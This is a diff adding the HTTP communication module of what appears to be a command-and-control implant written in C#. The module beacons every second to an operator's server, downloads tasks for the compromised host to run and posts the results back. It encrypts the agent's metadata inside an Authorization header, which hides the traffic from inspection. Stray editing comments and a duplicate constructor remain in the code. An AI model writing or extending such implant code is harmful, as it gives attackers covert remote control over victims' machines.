@@ -1,0 +1,108 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Text;
+using ApiModules.Crypto;
+
+namespace Agent.Models
+{
+    public class HttpCommModule : CommModule
+    {
+        public string ConnectAddress { get; set; }
+        public int ConnectPort { get; set; }
+
+        private CancellationTokenSource _tokenSource;
+        private HttpClient _client;
+
+        public HttpCommModule(string connectAddress, int connectPort)
+        {
+            ConnectAddress = connectAddress;
+            ConnectPort = connectPort;
+        }
+
+        // Add this field at the top of the class alongside the other fields
+        private readonly string _encryptionKey;
+
+        // Update the constructor to accept the key
+        public HttpCommModule(string connectAddress, int connectPort, string encryptionKey)
+        {
+            ConnectAddress = connectAddress;
+            ConnectPort = connectPort;
+            _encryptionKey = encryptionKey;
+        }
+
+        public override void Init(AgentMetadata metadata)
+        {
+            base.Init(metadata);
+
+            _client = new HttpClient();
+            _client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
+            _client.DefaultRequestHeaders.Clear();
+
+            // Serialize the metadata to JSON, then ENCRYPT it before sending
+            // Instead of plain Base64 anyone can decode, this is now AES-256 encrypted
+            var metadataJson = Encoding.UTF8.GetString(AgentMetadata.Serialise());
+            var encryptedMetadata = AesEncryption.Encrypt(metadataJson, _encryptionKey);
+
+            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encryptedMetadata}");
+        }
+
+        public override async Task Start()
+        {
+            _tokenSource = new CancellationTokenSource();
+
+            while (!_tokenSource.IsCancellationRequested)
+            {
+                if (!Outbound.IsEmpty)
+                {
+                    await PostData();
+                }
+                else
+                {
+                    await CheckIn();
+                }
+
+                await Task.Delay(1000);
+            }
+        }
+
+        private async Task CheckIn()
+        {
+            var response = await _client.GetByteArrayAsync("/");
+            HandleResponse(response);
+        }
+
+        private async Task PostData()
+        {
+            var outbound = GetOutbound().Serialise();
+            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
+            var response = await _client.PostAsync("/", content);
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+            
+            HandleResponse(responseContent);
+        }
+
+        private void HandleResponse(byte[] response)
+        {
+            var tasks = response.Deserialise<AgentTask[]>();
+            
+            if (tasks != null && tasks.Any())
+            {
+                foreach (var task in tasks)
+                {
+                    Inbound.Enqueue(task);
+                }
+            }
+        }
+
+        public override void Stop()
+        {
+            _tokenSource.Cancel();
+        }
+    }
+}
